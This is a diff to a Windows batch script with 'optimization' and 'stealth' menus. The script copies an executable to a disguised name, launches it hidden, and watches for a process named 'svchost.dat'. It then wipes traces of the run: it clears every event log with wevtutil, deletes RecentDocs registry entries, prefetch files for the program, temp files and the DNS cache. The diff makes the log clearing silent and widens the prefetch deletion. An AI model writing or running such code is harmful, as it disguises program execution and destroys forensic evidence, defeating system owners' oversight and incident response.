@@ -78,16 +78,16 @@ goto OPTIMIZATION_MENU
 :CLEAN_REGISTRY_LOGS
 echo Cleaning Registry Logs...
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G"
+    wevtutil cl "%%G" >nul 2>&1
 )
 echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
-echo Cleaning Event Logs...
+echo Cleaning Event Logs (skipping protected logs)...
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G"
+    wevtutil cl "%%G" >nul 2>&1
 )
 echo Event logs cleared.
 pause
@@ -172,7 +172,6 @@ if exist "%SETUP_EXE%" (
 pause
 goto STEALTH_MENU
 
-
 :RUN
 echo Preparing disguised EXE...
 
@@ -185,7 +184,6 @@ if not exist "%SETUP_EXE%" (
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
 start "" /b "%DISGUISED_EXE%"
 
-:: Wait loop
 :WAIT_LOOP
 timeout /t 2 >nul
 tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
@@ -204,16 +202,16 @@ echo Running cleanup...
 :: Clear recent files
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
 
-:: Clear prefetch files related ONLY to CAXVN.exe (original EXE)
-del /q /f "%SystemRoot%\Prefetch\CAXVN-*.pf" >nul 2>&1
+:: Clear prefetch files (only EXE-related if name known)
+del /q /f "%SystemRoot%\Prefetch\CAXVN*.pf" >nul 2>&1
 
 :: Clear temp files
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
 
-:: Clear event logs
+:: Clear event logs (skip errors)
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G"
+    wevtutil cl "%%G" >nul 2>&1
 )
 
 :: Flush DNS
